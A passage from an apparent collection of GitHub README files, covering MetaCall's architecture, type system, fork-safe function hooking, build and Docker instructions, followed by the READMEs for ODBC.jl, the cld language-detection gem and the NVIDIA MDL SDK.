**`DETOUR_LIBRARY_PATH`** | Directory where detour plugins to be loaded are located          |          **`detours`**           |\n| **`SERIAL_LIBRARY_PATH`** | Directory where serial plugins to be loaded are located          |          **`serials`**           |\n| **`CONFIGURATION_PATH`**  | File path where the **METACALL** global configuration is located | **`configurations\/global.json`** |\n| **`LOADER_LIBRARY_PATH`** | Directory where loader plugins to be loaded are located          |          **`loaders`**           |\n| **`LOADER_SCRIPT_PATH`**  | Directory where scripts to be loaded are located                 | **`${execution_path}`** &#x00B9; |\n\n&#x00B9; **`${execution_path}`** defines the path where the program is executed, **`.`** in Linux.\n\n### 4.3 Examples\n\n- [MetaCall CLI](\/source\/examples\/metacallcli). Example of a Command Language Interpreter based on MetaCall where you can load, unload scripts and call their functions.\n\n- [MetaCall Rotulin](https:\/\/github.com\/metacall\/rotulin). Example of a multi-language application built with **METACALL**. This application embeds a Django server with a Ruby DataBase and C# business layer based on ImageMagick.\n\n## 5. Architecture\n\n### 5.1 Overview\n\n#### 5.1.1 Design Decisions\n\n- To provide an high level API with a simple UX and to be easy to understand.\n\n- To work in high performance environments.\n\n- To be as cross-platform as possible.\n\n- To avoid to modify run-times directly or use the code inside **METACALL** in order to avoid maintaining them, or propagating security flaws or licenses into **METACALL**.\n\n- To provide support for any embeddable programming language and to provide support for **METACALL** to be used form any programming language.\n\n- All external code used into **METACALL** must be introduced by inversion of control in the plugin system, so that the core must not remain aware from what software is using.\n\n- All code developed in **METACALL** must be implemented in standalone libraries that can work by itself in an isolated way (aka modules).\n\n#### 5.1.2 Modules\n\n- [`adt`](\/source\/adt) provides a base for Abstract Data Types and algorithms used in **METACALL**. Implementation must be done in an efficient and generic way. Some of the data structures implemented are vector, set, hash, comparable or trie.\n\n- [`detour`](\/source\/detour) provides an interface to hook into functions. Detours are used by the [fork model](#57-fork-model) to intercept fork calls.\n\n- [`detours`](\/source\/detours) implement the [`detour`](\/source\/detour) interface by using a plugin architecture. The current list of available detour plugins is the following one.\n  - [`funchook_detour`](\/source\/detours\/funchook_detour) implemented by means of FuncHook library.\n\n- [`distributable`](\/source\/distributable) defines the compilation of **METACALL** that generates an unique library with all core libraries bundled into it. As the **METACALL** architecture is divided by modules, in order to distribute **METACALL** is needed to build all of them into a single library. This module implements this compilation by means of CMake.\n\n- [`dynlink`](\/source\/dynlink) implements a cross-platform method to dynamically load libraries. It is used to dynamically load plugins into **METACALL**.\n\n- [`environment`](\/source\/environment) implements an standard way to deal with environment variables. **METACALL** uses environment variables to define custom paths for plugins and scripts.\n\n- [`examples`](\/source\/examples) ...\n\n- [`filesystem`](\/source\/filesystem) provides an abstraction for operative system file system.\n\n- [`format`](\/source\/format) provides an standard way for printing to standard input output for old C versions that does not support newest constructions.\n\n- [`loader`](\/source\/loader) ...\n\n- [`loaders`](\/source\/loaders)\n\n- [`log`](\/source\/log)\n\n- [`memory`](\/source\/memory)\n\n- [`metacall`](\/source\/metacall)\n\n- [`ports`](\/source\/ports)\n\n- [`preprocessor`](\/source\/preprocessor)\n\n- [`reflect`](\/source\/reflect)\n\n- [`scripts`](\/source\/scripts)\n\n- [`serial`](\/source\/serial)\n\n- [`serials`](\/source\/serials)\n\n- [`tests`](\/source\/tests)\n\n- [`version`](\/source\/version)\n\n### 5.2 Reflect\n\nThe module that holds the representation of types, values and functions is called [`reflect`](\/source\/reflect) and it handles the abstraction of code loaded into **METACALL**.\n\n**METACALL** uses reflection and introspection techniques to inspect the code loaded by the [`loaders`](\/source\/loaders) in order to interpret it and provide an higher abstraction of it. With this higher abstraction **METACALL** can easily inter-operate between languages transparently.\n\n#### 5.2.1 Type System\n\n**METACALL** implements an abstract type system which is a binary representation of the types supported by it. This means that **METACALL** can convert any type of a language to its own type system and back. Each loader is responsible of doing this conversions.\n\n**METACALL** maintains most of the types of the languages but not all are supported. If new types are added they have to be implemented in the [`reflect`](\/source\/reflect) module and also in the [`loaders`](\/source\/loaders) and [`serials`](\/source\/serials) to fully support it.\n\n|  Type   | Value                                                              |\n|:-------:|--------------------------------------------------------------------|\n| Boolean | `true` or `false`                                                  |\n|  Char   | `-128` to `127`                                                    |\n|  Short  | `-32,768` to `32,767`                                              |\n|   Int   | `-2,147,483,648` to `2,147,483,647`                                |\n|  Long   | `\u20139,223,372,036,854,775,808` to `9,223,372,036,854,775,807`        |\n|  Float  | `1.2E-38` to `3.4E+38`                                             |\n| Double  | `2.3E-308` to `1.7E+308`                                           |\n| String  | NULL terminated list of characters                                 |\n| Buffer  | Blob of memory representing a binary data                          |\n|  Array  | Arrangement of values of any type                                  |\n|   Map   | List of elements formed by a key (String) value (Any) pair (Array) |\n| Pointer | Low level representation of a memory reference                     |\n|  Null   | Representation of NULL value type                                  |\n\n- Boolean is mostly represented by an integer value. There are languages that does not support it so it gets converted to a integer value in the memory layout.\n\n- Integer and Floating Point values provide a complete abstraction to numerical types. Type sizes are preserved and the correct type is used when using any number. This depends on the internal implementation of the value by the run-time. Although there can be problems related to this. A `bignum` type from Ruby may overflow if it is too big when trying to convert it to a `float` type in C#.\n\n- String is represented by ASCII encoding currently. Future versions will implement multiple encodings to be interoperable between other language encodings.\n\n- Buffer represents a blob of raw memory (i.e. an array of bytes). This can be used to represent files as images or any other resources into memory.\n\n- Array is implemented by means of array of values, which you can think it should be called _list_ instead. But as the memory layout is stored into a contiguous memory block of references to values, it is considered an array.\n\n- Map implements an associative key value pair container. A map is implemented with an array of two sized elements array. Each element of the map is an array of size two, where the first element of it is always an String and the second element is a value of any type.\n\n- Pointer is an opaque value representing a raw reference to a memory block. Some languages allow to use references to memory and some others not. This type is opaque because **METACALL** does not know what kind of concrete value represents it. The representation may be a complex type handled by the developer source code inside the run-time.\n\n- Null type implements a null value. This type has only been implemented in order to support null value from multiple run-times. It represents a null value and it does not have data size on the value allocated.\n\n#### 5.2.2 Values\n\nValues represent the instances of the **METACALL** type system.\n\nThe memory layout guarantees to fit at least the same size of the types into memory. This means if a boolean type can be represented with one bit inside a value of one byte size, maybe this value is stored in a bigger memory block and this fact is architecture and platform dependant.\n\nWhen converting values between different types, if any potential number overflow or invalid conversion between types is done, **METACALL** will warn about it. If any conversion of types can be handled by **METACALL**, it will automatically cast or transform the values into the target type automatically in order to avoid errors in the call.\n\nThe value model is implemented by means of object pool. Each value is a reference to a memory block allocated from a memory pool (which can be injected into **METACALL**). The references can be passed by value, this means **METACALL** copies the reference value instead of the data which this reference is pointing to, like most run-times do when managing their own values.\n\nEach created value must be destroyed manually. Otherwise it will lead to a memory leak. This fact only occurs when dealing with **METACALL** at C level. If **METACALL** is being used in an higher language through [`ports`](\/source\/ports), the developer does not have to care about memory management.\n\nThe value memory layout is described in the following form.\n\n| Memory Offset | `0` to `sizeof(data) - 1` | `sizeof(data)` to `sizeof(data) + sizeof(type_id) - 1` |\n|:-------------:|:-------------------------:|:------------------------------------------------------:|\n|  **Content**  |         **DATA**          |                      **TYPE ID**                       |\n\nThis layout is used by the following reasons.\n\n- Data is located at the first position of the memory block, so it can be used as a normal low level value. This allows to threat **METACALL** values as a normal C values. Therefore you can use **METACALL** with normal pointers to existing variables, literal values as shown in the previous examples or **METACALL** values.\n\n- Data can be accessed faster as it is located at first position of the memory block. There is not extra calculation of an offset when trying to access the pointer.\n\n- Data and type id are contiguously allocated in order to threat it as the same memory block so it can be freed with one operation.\n\n#### 5.2.3 Functions\n\nFunctions are an abstract callable representation of functions, methods or procedures loaded by [`loaders`](\/source\/loaders). The functions are like a template who is linked to a loader run-time and allows to do a foreign function call.\n\nA function is composed by a name and a signature. The signature defines the arguments name, type, and return type if any. When a function is loaded, **METACALL** tries to inspect the signature and records the types if any. It stores the arguments name and size and also a concrete type that will be used later by the loader to implement the call to the run-time.\n\nThe function interface must be implemented by the [`loaders`](\/source\/loaders) and it has the following form.\n\n``` c\ntypedef struct function_interface_type\n{\n  function_impl_interface_create create;\n  function_impl_interface_invoke invoke;\n  function_impl_interface_await await;\n  function_impl_interface_destroy destroy;\n\n} * function_interface;\n```\n\n- `create` instantiates the function concrete data related to the run-time.\n- `invoke` transforms arguments from [`reflect`](\/source\/reflect) abstract types to run-time concrete types, executes the call in the run-time, and converts the result of the call from run-time concrete type to [`reflect`](\/source\/reflect) abstract type.\n- `await` idem to invoke but awaiting the promise that is expected to be returned by the function.\n- `destroy` clears all data previously instantiated in `create`.\n\nThe type deduction can be done at different levels. For example, it is possible to guess function types from the loaded code.\n\n``` python\ndef multiply_type(a: int, b: int) -> int:\n  return a * b\n```\n\nIf this code is loaded, **METACALL** will be able to inspect the types and define the signature. Signature includes the names of the arguments, the types of those arguments if any, and the return type if any.\n\nIt may be possible that the function loaded into **METACALL** is duck typed. This means it does not have information about what types it supports and therefore they cannot be inspected statically.\n\n``` python\ndef multiply_duck(a, b):\n  return a * b\n```\n\nAt low level **METACALL** must always know the types to do the call. This types can be inferred statically or dynamically and this has implications over the call model.\n\nIn the first example, we can simply call the function without specifying the types.\n\n``` c\nmetacall(\"multiply_type\", 3, 4); \/\/ 12\n```\n\nAs the signature is already know the literal values `3` and `4` can be converted into **METACALL** values automatically. Note that in this case, as literal values are provided, if we pass a double floating point, the memory representation of the value will be corrupted as there is no possible way to detect input values and cast them to the correct target values.\n\nIn the second example, the values are not know. If we use the same API to call the function, **METACALL** will not be able to call correctly the function as its types are not know. To allow calls to duck typed functions the developer must specify the value types he is passing to the function.\n\n``` c\nconst enum metacall_value_id multiply_types[] =\n{\n  METACALL_INT, METACALL_INT\n};\n\nmetacallt(\"multiply_duck\", multiply_types, 3, 4); \/\/ 12\n```\n\nThis method allows to pass different value types to the same function. The following call would be valid too.\n\n``` c\nconst enum metacall_value_id multiply_types[] =\n{\n  METACALL_DOUBLE, METACALL_DOUBLE\n};\n\nmetacallt(\"multiply_duck\", multiply_types, 3.0, 4.0); \/\/ 12.0\n```\n\n### 5.3 Plugins\n\n**METACALL** has a plugin architecture implemented at multiple levels.\n\n- Loaders implement a layer of plugins related to the run-times.\n\n- Serials implement a layer of (de)serializers in order to transform input (arguments) or output (return value) of the calls into a generic format.\n\n- Detours is another layer of plugins focused on low level function interception (hooks).\n\nEach plugin is a piece of software that can be dynamically loaded into the **METACALL** core, used and unloaded when it is not needed anymore.\n\n#### 5.3.1 Loaders\n\nLoaders are responsible for embedding run-times into **METACALL**. Each loader has the following interface.\n\n``` c\ntypedef struct loader_impl_interface_type\n{\n  loader_impl_interface_initialize initialize;\n  loader_impl_interface_execution_path execution_path;\n  loader_impl_interface_load_from_file load_from_file;\n  loader_impl_interface_load_from_memory load_from_memory;\n  loader_impl_interface_load_from_package load_from_package;\n  loader_impl_interface_clear clear;\n  loader_impl_interface_discover discover;\n  loader_impl_interface_destroy destroy;\n\n} * loader_impl_interface;\n```\n\nA loader must implement it to be considered a valid loader.\n\n- `initialize` starts up the run-time.\n- `execution_path` defines a new import path to the run-time.\n- `load_from_file` loads a code from file into the run-time and returns a handle which represents it.\n- `load_from_memory` loads a code from memory into the run-time and returns a handle which represents it.\n- `load_from_package` loads a code from a compiled library or package into the run-time and returns a handle which represents it.\n- `clear` unloads a handle from the run-time.\n- `discover` inspects a handle previously loaded.\n- `destroy` shutdowns the run-time.\n\n##### 5.3.1.1 Python\n\n##### 5.3.1.2 NodeJS\n\n##### 5.3.1.3 JavaScript\n\n##### 5.3.1.4 C# #\n\n##### 5.3.1.5 Ruby\n\n##### 5.3.1.6 Mock\n\n##### 5.3.1.7 File\n\n#### 5.3.2 Serials\n\n##### 5.3.2.1 MetaCall\n\n##### 5.3.2.2 RapidJSON\n\n#### 5.3.3 Detours\n\n##### 5.3.3.1 FuncHook\n\n### 5.4 Ports\n\n### 5.5 Serialization\n\n### 5.6 Memory Layout\n\n### 5.7 Fork Model\n\n**METACALL** implements a fork safe model. This means if **METACALL** is running in any program instance, the process where is running can be forked safely at any moment of the execution. This fact has many implications at design, implementation and use level. But the whole **METACALL** architecture tries to remove all responsibility from the developer and make this transparent.\n\nTo understand the **METACALL** fork model, first of all we have to understand the implications of the forking model in operative systems and the difference between [fork-one and fork-all models](https:\/\/docs.oracle.com\/cd\/E37838_01\/html\/E61057\/gen-1.html).\n\nThe main difference between fork-one and fork-all is that in fork-one only the thread which called the fork is preserved after the fork (i.e. gets cloned). In fork-all model, all threads are preserved after cloning. POSIX uses fork-one model, meanwhile Oracle Solaris use the fork-all model.\n\nBecause of fork-one model, forking a running run-time like NodeJS (which has a thread pool) implies that in the child process the thread pool will be almost dead except the thread which did the fork call. So NodeJS run-time cannot continue the execution anymore and the event-loop enters into a deadlock state.\n\nWhen a fork is done, the status of the execution is lost by the moment. **METACALL** is not able to preserve the state when a fork is done. Some run-times do not allow to preserve the internal state. For example, the bad design<sup>[[0]](https:\/\/github.com\/nodejs\/node\/issues\/23265)[[1]](https:\/\/github.com\/nodejs\/node\/issues\/23265#issuecomment-452690239)[[2]](https:\/\/github.com\/nodejs\/node\/issues\/23265#issuecomment-496873739)[[3]](https:\/\/github.com\/nodejs\/node\/issues\/23265#issuecomment-496878712)[[4]](https:\/\/github.com\/nodejs\/node\/issues\/23265#issuecomment-496910654)[[5]](https:\/\/github.com\/nodejs\/node\/issues\/23265#issuecomment-496918901)<\/sup> of NodeJS does not allow to manage the thread pool from outside, so it cannot be preserved after a fork.\n\nBecause of these restrictions, **METACALL** cannot preserve the status of the run-times. In the future this model will be improved to maintain consistency and preserve the execution state of the run-times making **METACALL** more robust.\n\nAlthough the state is not preserved, fork safety is. The mechanism **METACALL** uses to allow fork safety is described in the following enumeration.\n\n1) Intercept fork call done by the program where **METACALL** is running.\n\n2) Shutdown all run-times by means of unloading all loaders.\n\n3) Execute the real fork function.\n\n4) Restore all run-times by means of reloading all loaders.\n\n5) Execute user defined fork callback if any.\n\nTo achieve this, **METACALL** hooks fork primitives depending on the platform.\n\n- `fork` on POSIX systems.\n- `RtlCloneUserProcess` on Windows systems.\n\nIf you use `clone` instead of `fork` to spawn a new process in a POSIX system, **METACALL** won't catch it.\n\nWhenever you call a to a cloning primitive **METACALL** intercepts it by means of [**`detour`**](\/source\/detour). Detours is a way to intercept functions at low level by editing the memory and introducing a jump over your own function preserving the address of the old one. **METACALL** uses this method instead of POSIX `pthread_atfork` for three main reasons.\n\n- The first one is that `pthread_atfork` is only supported by POSIX systems. So it is not a good solution because of the philosophy of **METACALL** is to be as cross-platform as possible.\n\n- The second is that `pthread_atfork` has a [bug in the design of the standard](https:\/\/stackoverflow.com\/a\/6605487). It was designed to solve a problem which cannot be solved with `pthread_atfork` itself. This means that even having the control of NodeJS thread pool, it will not be possible to restore the [mutexes](https:\/\/github.com\/nodejs\/node\/blob\/v8.x\/src\/node_platform.cc) in the child process. The only possibility is to re-implement the thread pool of NodeJS with async safe primitives like a semaphore. Async safe primitives will be able to work in the child process handler. But this is not possible as it enters in conflict with the design decision of to not modify the run-times.\n\n- The third one is that the mechanism of `pthread_atfork` also [will be deprecated](http:\/\/pubs.opengroup.org\/onlinepubs\/9699919799\/functions\/pthread_atfork.html) because of second reason.\n  > The `pthread_atfork()` function may be formally deprecated (for example, by shading it OB) in a future version of this standard.\n\nDetours model is not safe. It is platform dependant and implies that the program modifies the memory of itself during the execution which is not safe at all and can induce bugs or security flaws if it is not done correctly. But because of limitations of run-times, there is not another alternative to solve the problem of fork safety.\n\nUsually the developer is the same who does the fork, but it may be possible that **METACALL** is embedded into a larger application and the developer is in the middle between the application code and **METACALL** so it is impossible to control when a fork is done. Because of this the developer can register a callback by means of [**`metacall_fork`**](\/source\/metacall\/include\/metacall\/metacall_fork.h) to know when a fork is executed to do the actions needed after the fork, for example, re-loading all previous code and restore the state of the run-times. This gives a partial solution to the problem of losing the state when doing a fork.\n\n### 5.8 Threading Model\n\n## 5. Application Programming Interface (API)\n\n## 6. Build System\n\nFollow these steps to build and install **METACALL** manually.\n\n``` sh\ngit clone --recursive https:\/\/github.com\/metacall\/core.git\nmkdir core\/build && cd core\/build\ncmake ..\nmake\nmake test\nsudo make install\n```\n\n### 6.1 Build Options\n\nThese options can be set using **`-D`** prefix when configuring CMake. For example, the following configuration enables the build of Python and Ruby loaders.\n\n``` sh\ncmake -DOPTION_BUILD_LOADERS_PY=On -DOPTION_BUILD_LOADERS_RB=On ..\n```\n\nAvailable build options are the following ones.\n\n|        Build Option         | Description                                            | Default Value |\n|:---------------------------:|--------------------------------------------------------|:-------------:|\n|    **BUILD_SHARED_LIBS**    | Build shared instead of static libraries.              |      ON       |\n| **OPTION_BUILD_DIST_LIBS**  | Build all libraries into a single compilation unit.    |      ON       |\n|  **OPTION_SELF_CONTAINED**  | Create a self-contained install with all dependencies. |      OFF      |\n|   **OPTION_BUILD_TESTS**    | Build tests.                                           |      ON       |\n| **OPTION_BUILD_BENCHMARKS** | Build benchmarks.                                      |      OFF      |\n|    **OPTION_BUILD_DOCS**    | Build documentation.                                   |      OFF      |\n|  **OPTION_BUILD_EXAMPLES**  | Build examples.                                        |      ON       |\n|  **OPTION_BUILD_LOADERS**   | Build loaders.                                         |      ON       |\n|  **OPTION_BUILD_SCRIPTS**   | Build scripts.                                         |      ON       |\n|  **OPTION_BUILD_SERIALS**   | Build serials.                                         |      ON       |\n|  **OPTION_BUILD_DETOURS**   | Build detours.                                         |      ON       |\n|   **OPTION_BUILD_PORTS**    | Build ports.                                           |      OFF      |\n|    **OPTION_FORK_SAFE**     | Enable fork safety.                                    |      OFF      |\n|   **OPTION_THREAD_SAFE**    | Enable thread safety.                                  |      OFF      |\n|     **OPTION_COVERAGE**     | Enable coverage.                                       |      OFF      |\n|    **CMAKE_BUILD_TYPE**     | Define the type of build.                              |    Release    |\n\nIt is possible to enable or disable concrete loaders, script, ports, serials or detours. For building use the following options.\n\n|    Build Option Prefix    | Build Option Suffix                                                   |\n|:-------------------------:|-----------------------------------------------------------------------|\n| **OPTION_BUILD_LOADERS_** | `C` `JS` `CS` `MOCK` `PY` `JSM` `NODE` `RB` `JSM` `FILE`              |\n| **OPTION_BUILD_SCRIPTS_** | `C` `CS` `JS` `NODE` `PY` `RB` `JAVA`                                 |\n| **OPTION_BUILD_SERIALS_** | `METACALL` `RAPID_JSON`                                               |\n| **OPTION_BUILD_DETOURS_** | `FUNCHOOK`                                                            |\n|  **OPTION_BUILD_PORTS_**  | `CS` `CXX` `D` `GO` `JAVA` `JS` `LUA` `NODE` `PHP` `PL` `PY` `R` `RB` |\n\n### 6.2 Coverage\n\nIn order to run code coverage and obtain html reports use the following commands. Note, test must be run before executing code coverage.\n\n``` sh\nmake\nmake test\nmake -k gcov\nmake -k lcov\nmake -k lcov-genhtml\n```\n\nThe output reports will be generated in `${CMAKE_BINARY_DIR}\/lcov\/html\/selected_targets` in html format.\n\nTo obtain a report of a single `target` do:\n\n``` sh\nmake\nmake test\nmake <target>-gcov\nmake <target>-geninfo\nmake <target>-genhtml\n```\n\n## 7. Platform Support\n\nThe following platforms and architectures have been tested an work correctly with all plugins of **METACALL**.\n\n|     Operative System      |    Architecture     |    Compiler     |                                              Build Status                                              |\n|:-------------------------:|:-------------------:|:---------------:|:------------------------------------------------------------------------------------------------------:|\n|    **`ubuntu:xenial`**    |     **`amd64`**     |    **`gcc`**    |                                                                                                        |\n| **`debian:stretch-slim`** |     **`amd64`**     | **`gcc:6.3.0`** | [![build](https:\/\/gitlab.com\/metacall\/core\/badges\/master\/build.svg)](https:\/\/gitlab.com\/metacall\/core) |\n| **`debian:buster-slim`**  |     **`amd64`**     | **`gcc:8.2.0`** |                                                                                                        |\n|       **`windows`**       | **`x86`** **`x64`** |   **`msvc`**    |                                                                                                        |\n\n### 7.1 Docker Support\n\nTo provide a reproducible environment **METACALL** is also distributed under Docker on [DockerHub](https:\/\/hub.docker.com\/r\/metacall\/core). Current images are based on `debian:stretch-slim` for `amd64` architecture.\n\nFor pulling the **METACALL** `latest` image containing the runtime, use:\n\n``` sh\ndocker pull metacall\/core\n```\n\nFor pulling a specific image depending on the tag, use:\n\n- **METACALL** `deps` image. Includes all dependencies for development:\n\n``` sh\ndocker pull metacall\/core:deps\n```\n\n- **METACALL** `dev` image. Includes all dependencies, headers and libraries for development:\n\n``` sh\ndocker pull metacall\/core:dev\n```\n\n- **METACALL** `runtime` image. Includes all dependencies and libraries for runtime:\n\n``` sh\ndocker pull metacall\/core:runtime\n```\n\n- **METACALL** `cli` image. Includes all dependencies and libraries for runtime and the CLI as entry point (equivalent to `latest`):\n\n``` sh\ndocker pull metacall\/core:cli\n```\n\n### 7.1.1 Docker Development\n\nIt is possible to develop **METACALL** itself or applications using **METACALL** as standalone library with Docker. The `dev` image can be used for development. It contains all dependencies with all run-times installed with the code, allowing debugging too.\n\nUse the following commands to start developing with **METACALL**:\n\n``` sh\nmkdir -p $HOME\/metacall\ncode $HOME\/metacall\n```\n\nWe are going to run a docker container with a mounted volume. This volume will connect the `LOADER_SCRIPT_PATH` inside the container, and your development path in the host. We are using `$HOME\/metacall`, where we have our editor opened.\n\n``` sh\ndocker pull metacall\/core:dev\ndocker run -e LOADER_SCRIPT_PATH=\/metacall -v $HOME\/metacall:\/metacall -w \/metacall -it metacall\/core:dev \/bin\/bash\n```\n\nInside docker terminal you can run `python` or `ruby` command to test what you are developing. You can also run `metacallcli` to test (load, clear, inspect and call).\n\n### 7.1.2 Docker Testing\n\nAn alternative for testing is to use a reduced image that includes the runtime and also the CLI. This alternative allows fast prototyping and CLI management in order to test and inspect your own scripts.\n\nUse the following commands to start testing with **METACALL**:\n\n``` sh\nmkdir -p $HOME\/metacall\ncode $HOME\/metacall\n```\n\nWe are going to run a docker container with a mounted volume. This volume will connect the `LOADER_SCRIPT_PATH` inside the container, and your development path in the host. We are using `$HOME\/metacall`, where we have our editor opened.\n\n``` sh\ndocker pull metacall\/core:cli\ndocker run -e LOADER_SCRIPT_PATH=\/metacall -v $HOME\/metacall:\/metacall -w \/metacall -it metacall\/core:cli\n```\n\nAfter the container is up, it is possible to load any script contained in host folder `$HOME\/metacall`. If we have a `script.js` inside the folder, we can just load it (each line beginning with `>` is the input command):\n\n`script.js`\n``` js\nfunction sum(left, right) {\n    return left + right;\n}\n\nmodule.exports = {\n    sum\n};\n```\n\n`Command Line Interface`\n``` sh\n> load node script.js\nScript (script.js) loaded correctly\n> inspect\nruntime node {\n    module script {\n        function sum(left, right)\n    }\n}\nruntime __metacall_host__\n> call sum(3, 5)\n8.0\n> exit\n```\n\nWhere `script.js` is a script contained in host folder `$HOME\/metacall` that will be loaded on the CLI after starting up the container. Type `help` to see all available CLI commands.\n\n## 8. License\n\n**METACALL** is licensed under **[Apache License Version 2.0](\/LICENSE)**.\n\n>Copyright (C) 2016 - 2019 Vicente Eduardo Ferrer Garcia <<vic798@gmail.com>>\n>\n>Licensed under the Apache License, Version 2.0 (the \"License\");\n>you may not use this file except in compliance with the License.\n>You may obtain a copy of the License at\n>\n>       http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n>\n>Unless required by applicable law or agreed to in writing, software\n>distributed under the License is distributed on an \"AS IS\" BASIS,\n>WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n>See the License for the specific language governing permissions and\n>limitations under the License.\n"},{"repo":"\/JuliaDatabases\/ODBC.jl","language":"C","readme_contents":"\n# ODBC\n\n*A Julia library for interacting with the ODBC API*\n\n| **Documentation**                                                               | **PackageEvaluator**                                            | **Build Status**                                                                                |\n|:-------------------------------------------------------------------------------:|:---------------------------------------------------------------:|:-----------------------------------------------------------------------------------------------:|\n| [![][docs-stable-img]][docs-stable-url] [![][docs-latest-img]][docs-latest-url] | [![][pkg-0.5-img]][pkg-0.5-url] | [![][travis-img]][travis-url] [![][appveyor-img]][appveyor-url] [![][codecov-img]][codecov-url] |\n\n\n## Installation\n\nThe package is registered in `METADATA.jl` and so can be installed with `Pkg.add`.\n\n```julia\njulia> Pkg.add(\"ODBC\")\n```\n\n## Documentation\n\n- [**STABLE**][docs-stable-url] &mdash; **most recently tagged version of the documentation.**\n- [**LATEST**][docs-latest-url] &mdash; *in-development version of the documentation.*\n\n## Project Status\n\nThe package is tested against Julia `1.0` on Linux, OSX, and Windows.\n\n## Contributing and Questions\n\nContributions are very welcome, as are feature requests and suggestions. Please open an\n[issue][issues-url] if you encounter any problems or would just like to ask a question.\n\n\n\n[docs-latest-img]: https:\/\/img.shields.io\/badge\/docs-latest-blue.svg\n[docs-latest-url]: http:\/\/juliadatabases.github.io\/ODBC.jl\/latest\n\n[docs-stable-img]: https:\/\/img.shields.io\/badge\/docs-stable-blue.svg\n[docs-stable-url]: http:\/\/juliadatabases.github.io\/ODBC.jl\/stable\n\n[travis-img]: https:\/\/travis-ci.org\/JuliaDatabases\/ODBC.jl.svg?branch=master\n[travis-url]: https:\/\/travis-ci.org\/JuliaDatabases\/ODBC.jl\n\n[appveyor-img]: https:\/\/ci.appveyor.com\/api\/projects\/status\/h227adt6ovd1u3sx\/branch\/master?svg=true\n[appveyor-url]: https:\/\/ci.appveyor.com\/project\/JuliaDatabases\/documenter-jl\/branch\/master\n\n[codecov-img]: https:\/\/codecov.io\/gh\/JuliaDatabases\/ODBC.jl\/branch\/master\/graph\/badge.svg\n[codecov-url]: https:\/\/codecov.io\/gh\/JuliaDatabases\/ODBC.jl\n\n[issues-url]: https:\/\/github.com\/JuliaDatabases\/ODBC.jl\/issues\n\n[pkg-0.5-img]: http:\/\/pkg.julialang.org\/badges\/ODBC_0.5.svg\n[pkg-0.5-url]: http:\/\/pkg.julialang.org\/?pkg=ODBC\n"},{"repo":"\/jtoy\/cld","language":"C++","readme_contents":"# Compact Language Detection\n\nBlazing-fast language detection for Ruby provided by\nGoogle Chrome's Compact Language Detector.\n\n## How to Use\n\n```ruby\nCLD.detect_language(\"This is a test\")\n# => {:name => \"ENGLISH\", :code => \"en\", :reliable => true}\n\nCLD.detect_language(\"plus \u00e7a change, plus c'est la m\u00eame chose\")\n# => {:name => \"FRENCH\", :code => \"fr\", :reliable => true}\n```\n\n## Installation\n\nAdd this line to your application's Gemfile:\n\n```ruby\ngem \"cld\"\n```\n\nAnd then execute:\n\n```sh\n$ bundle\n```\n\n## Thanks\n\nThanks to the Chrome authors, and to Mike McCandless for writing a Python version.\n\nLicensed the same as Chrome.  Jason Toy"},{"repo":"\/NVIDIA\/MDL-SDK","language":"C++","readme_contents":"# NVIDIA MDL SDK\n\nThe NVIDIA MDL SDK enables the easy integration of MDL support into\nrendering and material editing applications. The SDK contains components\nfor loading, inspecting, and editing of material definitions as well as\ncompiling MDL materials and functions to PTX and LLVM-IR.\n\n\n## NVIDIA Material Definition Language (MDL)\n\n![MDL example material renderings](doc\/images\/mdl_material_examples.jpg)\n\nThe [NVIDIA Material Definition Language (MDL)](https:\/\/www.nvidia.com\/mdl) \nis a domain-specific programming language for defining physically-based \nmaterials for rendering. It allows you to define  *materials* and *functions*,\nwhich you can organize in *modules* and *packages* to create flexible, \ncustom-built material catalogs.\n\nMaterial definitions are written in a declarative style; they define\nwhat to compute -- not how to compute it. This is the central premise in \nMDL where one material definition delivers the same appearance in many\nrendering algorithms. Following is a simple example of a diffuse material \nin MDL:\n\n    material diffuse ( color diffuse_color = color(0.7))\n        = material(\n            surface: material_surface (\n                scattering: df::diffuse_reflection_bsdf (\n                    tint: diffuse_color\n                )\n            )\n        );\n\nThe function definitions in MDL are written in a procedural programming\nstyle. Their use is limited to computing material parameters in a \nside-effect-free manner.\n\nThe clear separation of material definitions from function definitions and \ntheir respective constraints makes possible the optimization of rendering \nalgorithms independently of the material definition.\n\n\n## Pre-compiled Binaries\n\nNVIDIA offers a binary release of the MDL SDK, see \n[https:\/\/developer.nvidia.com\/mdl-sdk](https:\/\/developer.nvidia.com\/mdl-sdk). \nThe binary release is different in some functionality as documented in the \n[Change Log](CHANGELOG.md).\n\n\n## Support\n\n- [NVIDIA MDL SDK Forum](https:\/\/devtalk.nvidia.com\/default\/board\/253\/mdl-sdk\/)\n\n\n## Building the MDL SDK from Source\n\nMDL uses [CMake](http:\/\/www.cmake.org\/) to generate build files for a \nparticular development environment. It is suggested to use CMake 3.11 or later, \nwhich can be downloaded from the [CMake Website](https:\/\/cmake.org\/download\/).\nWhen using a Unix-like system, you can install the *cmake* package using \nthe respective package management systems. On the Mac OS X platform, third party\ndependencies can be resolved using the [Homebrew Package Manager](https:\/\/brew.sh\/index_de).\n\n\n### Dependencies\n\nThe source code requires a C++11 compiler and several third-party libraries \nand tools to build the MDL SDK. Additional third-party libraries are used in \nthe examples.\n\nThe build with the following x64-platform-compiler combinations has been \nsuccessfully tested:\n\n-   **Windows 10:**     Microsoft Visual Studio 2015 (msvc v140)\n-   **Ubuntu 18.04:**   gcc\/g++6 and gcc\/g++7\n-   **Mac OS X 10.13:** Xcode 8.3.3 (Apple Clang 8.1)\n\nThe versions listed with the following dependencies have been\nsuccessfully tested. Where not mentioned otherwise, other versions\nmight work as well.\n\n<a name=\"thirdparty-dependencies-libs\"><\/a>\nThe following third-party libraries are required to build the MDL SDK:\n\n-   **Boost** *(1.67.0)* (headers)  \n    Linux: Install the *libboost-dev* package.  \n    Windows: Download and extract the boost source code from \n    [boost.org](https:\/\/www.boost.org\/users\/download\/).  \n    Mac OS X: Install the *boost* package using brew.\n\n-   **FreeImage** *(3.17.0)*  \n    Linux: Install the *libfreeimage-dev* package.  \n    Windows: Download and extract the pre-compiled binaries from \n    [freeimage.sourceforge.net](http:\/\/freeimage.sourceforge.net\/download.html).  \n    Mac OS X: Install the *freeimage* package using brew.\n\n-   **Python2** *(2.7.1)*  \n    Linux: Install the *python* package.  \n    Windows and Max OS X: Download and install Python 2.7 from \n    [python.org](https:\/\/www.python.org\/downloads\/).\n\n-   **Clang 3.4.1**  \n    Using version 3.4.1 is mandatory.  \n    Pre-compiled binaries can be found on \n    